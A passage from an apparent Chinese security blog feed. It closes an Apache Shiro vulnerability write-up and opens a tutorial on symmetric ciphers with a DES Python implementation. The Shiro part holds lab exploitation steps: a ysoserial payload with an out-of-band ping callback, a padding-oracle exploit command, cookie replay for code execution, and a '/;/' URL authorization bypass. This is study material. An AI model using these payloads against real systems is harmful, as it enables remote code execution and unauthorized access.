class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation."</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            WebSubjectContext wsc = (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                HttpServletRequest request = WebUtils.getHttpRequest(wsc);</span><br><span class="line">                HttpServletResponse response = WebUtils.getHttpResponse(wsc);</span><br><span class="line">                String base64 = <span class="keyword">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"deleteMe"</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="keyword">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">"Acquired Base64 encoded identity ["</span> + base64 + <span class="string">"]"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">"Base64 decoded byte array length: "</span> + (decoded != <span class="keyword">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">" bytes."</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再返回getRememberedPrincipals方法，调用this.convertBytesToPrincipals(bytes, subjectContext)，对rememberMe的base64解码后的值进行处理，跟进此方法，convertBytesToPrincipals 对传入的二进制字符串进行解密和反序列化操作。可以跟进decrypt方法查看具体的解密操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>decrypt方法中的调用 AES 的 CBC 模式进行解密，key为硬编码的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以解密过程为加密过程的相反操作，如果得知AES算法中的key（硬编码），就可以构造任意的反序列化字符串，进行RCE。 </p><p><strong>修复方式</strong>：   </p><p>官方针对这个问题的修复方式：</p><p>1、删除相关默认密钥</p><p>2、如果没有配置密钥，会随机生成一个密钥。</p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721-CVE-2019-12422）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）"></a>Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）</h1><p>Shiro实用AES-CBC模式进行加解密，存在Padding Oracle Attack漏洞，已登录的攻击者同样可进行反序列化操作。  </p><p>影响范围：Apache Shiro &lt; 1.4.2<br>利用条件：<br>1.攻击者知道密文和初始向量IV<br>2.padding错误和padding正确服务器可返回不一样的状态   </p><p>攻击效果：<br>正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文</p><p>shiro-1.25以前，AES密钥是硬编码到源码中的，因此可以更改RememberMe的值进行反序列化RCE</p><p>而1.2.5之后，shiro采用了随机密钥，也就引出了SHIRO-721，通过padding oracle attack的方式得到，</p><p>根据p0师傅之前的文章，在shiro中，当我们更改padding值时，padding正确但反序列化错误则会爆deserialize error；padding错误爆padding error</p><blockquote><p>RememberMe使用AES-128-CBC模式加密，容易受到Padding Oracle攻击，AES的初始化向量iv就是rememberMe的base64解码后的前16个字节，攻击者只要使用有效的RememberMe cookie作为Padding Oracle Attack 的前缀，然后就可以构造RememberMe进行反序列化攻击，攻击者无需知道RememberMe加密的密钥。</p></blockquote><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>环境配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/3ndz/Shiro-721.git</span><br><span class="line"><span class="built_in">cd</span> Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .</span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure><p>攻击流程：</p><ol><li>登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。</li><li>重放恶意RememberMe cookie，以执行反序列化攻击</li></ol><p>1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）<br>(1) 认证失败时会设置deleteMe的cookie:</p><p><img src="../../images/java/shiro/12.jpg" alt=""><br>(2) 认证成功则不会设置deleteMe的cookie:<br><img src="../../images/java/shiro/13.jpg" alt=""><br>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:</p><ul><li>构造的数据不能通过字符填充验证，返回deleteme;</li><li>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.</li></ul><p>获取cookie<br><img src="../../images/java/shiro/14.jpg" alt=""><br>2.生成java payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"ping awa4xw.ceye.io"</span> &gt; payload.class</span><br></pre></td></tr></table></figure><p>3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class</span><br></pre></td></tr></table></figure><p><img src="../../images/java/shiro/15.jpg" alt=""><br>4.复制该cookie，然后重放一下数据库，即可成功执行命令<br><img src="../../images/java/shiro/16.jpg" alt=""><br><img src="../../images/java/shiro/17.jpg" alt=""></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h1 id="Apache-Shiro权限绕过漏洞分析-CVE-2020-11989"><a href="#Apache-Shiro权限绕过漏洞分析-CVE-2020-11989" class="headerlink" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)"></a>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</h1><p>详情可看：  <a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p><p>影响范围</p><ul><li>Apache Shiro &lt; 1.5.3</li><li>Spring 框架中只使用 Shiro 鉴权</li></ul><p>利用条件：</p><ul><li>应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li><li>Spring控制器中没有另外的权限校验代码</li></ul><p>如果直接访问 /test/admin/page ，会返回302跳转要求登录<br><img src="../../images/java/shiro/1.png" alt=""><br>但是访问 /;/test/admin/page , 就能直接绕过Shiro权限验证，访问到/admin路由中的信息<br><img src="../../images/java/shiro/2.png" alt=""><br>漏油缘由：<br>Tomcat判断/;test/admin/page 为test应用下的/admin/page路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。 </p><p>另外一种思路： <a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a>  </p><p>参考文章：     </p><p>Apache Shiro权限绕过漏洞分析(CVE-2020-11989) ：<a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a><br>Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)： <a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652472138&idx=1&sn=6e9f38cca70ed22b6cec794f9c382657" target="_blank" rel="noopener">Shiro反序列化漏洞分析</a><br>Shiro反序列化分析带思路及组件检测笔记：<a href="https://xz.aliyun.com/t/8997" target="_blank" rel="noopener">https://xz.aliyun.com/t/8997</a><br>Shiro反序列化漏洞利用汇总:<a href="https://cloud.tencent.com/developer/article/1657019" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1657019</a><br>Shiro Padding Oracle Attack 反序列化：anquanke.com/post/id/200793<br>Shiro 721 Padding Oracle攻击漏洞分析:<a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a><br>从更深层面看Shiro Padding Oracle漏洞:<a href="https://www.anquanke.com/post/id/203869" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203869</a><br>Apache Shiro Padding Oracle反序列化漏洞分析（下）:<a href="https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2020/02/09/analysis-shiro-padding-oracle-2/" target="_blank" rel="noopener">https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2020/02/09/analysis-shiro-padding-oracle-2/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Shrio漏洞学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>对称加密算法</title>
    <link href="https://blog.cfyqy.com/article/f10abbf9.html"/>
    <id>https://blog.cfyqy.com/article/f10abbf9.html</id>
    <published>2021-01-25T08:00:37.000Z</published>
    <updated>2021-01-26T15:16:49.792Z</updated>
    
    <content type="html"><![CDATA[<p>对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。</p><a id="more"></a><p>对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明文的一组位进行运算，这些位组称为分组，相应的算法称为分组算法或分组密码。现代计算机密码算法的典型分组长度为64位――这个长度既考虑到分析破译密码的难度，又考虑到使用的方便性。后来，随着破译能力的发展，分组长度又提高到128位或更长。</p><p><strong>对称密码常用的数学运算</strong><br>对称密码当中有几种常用到的数学运算。这些运算的共同目的就是把被加密的明文数码尽可能深地打乱，从而加大破译的难度。</p><p>◆移位和循环移位<br>　　移位就是将一段数码按照规定的位数整体性地左移或右移。循环右移就是当右移时，把数码的最后的位移到数码的最前头，循环左移正相反。例如，对十进制数码12345678循环右移1位（十进制位）的结果为81234567，而循环左移1位的结果则为23456781。<br>◆置换<br>　　就是将数码中的某一位的值根据置换表的规定，用另一位代替。它不像移位操作那样整齐有序，看上去杂乱无章。这正是加密所需,被经常应用。<br>◆扩展<br>　　就是将一段数码扩展成比原来位数更长的数码。扩展方法有多种,例如,可以用置换的方法，以扩展置换表来规定扩展后的数码每一位的替代值。<br>◆压缩<br>　　就是将一段数码压缩成比原来位数更短的数码。压缩方法有多种，例如，也可以用置换的方法，以表来规定压缩后的数码每一位的替代值。<br>◆异或<br>　　这是一种二进制布尔代数运算。异或的数学符号为⊕ ，它的运算法则如下：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1⊕1 = 0</span><br><span class="line">0⊕0 = 0</span><br><span class="line">1⊕0 = 1</span><br><span class="line">0⊕1 = 1</span><br></pre></td></tr></table></figure><p>　　也可以简单地理解为，参与异或运算的两数位如相等，则结果为0，不等则为1。<br>◆迭代<br>　　迭代就是多次重复相同的运算，这在密码算法中经常使用，以使得形成的密文更加难以破解。  </p><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>DES算法为密码体制中的对称密码体制。需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法  </p><p><strong>DES算法加密流程描述</strong> ：<br>（1）输入64位明文数据，并进行初始置换IP；<br>（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；<br>（3）在秘钥的控制下，经过16轮运算(f)；<br>（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；<br>（5）输出64位密文。    </p><p><img src="../../images/cipher/DES/1.png" alt=""><br>python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#IP置换表 表示源数据的位置</span></span><br><span class="line">IP_table=[<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>,</span><br><span class="line">          <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,  <span class="number">6</span>,</span><br><span class="line">          <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">          <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>,</span><br><span class="line">          <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,  <span class="number">7</span>]</span><br><span class="line"><span class="comment">#逆IP置换表</span></span><br><span class="line">IP_table_=[<span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">           <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">           <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">           <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">           <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">           <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">           <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">           <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment">#密钥生成的置换表1 去校验位 64bit-&gt;56bit</span></span><br><span class="line">PC_1=[ <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">       <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">       <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">       <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">       <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">       <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">       <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>]</span><br><span class="line"><span class="comment">#密钥生成的置换压缩表2 56bit-&gt;48bit</span></span><br><span class="line">PC_2=[<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">      <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">      <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">      <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"><span class="comment">#S盒中的S1盒</span></span><br><span class="line">S1=[<span class="number">14</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  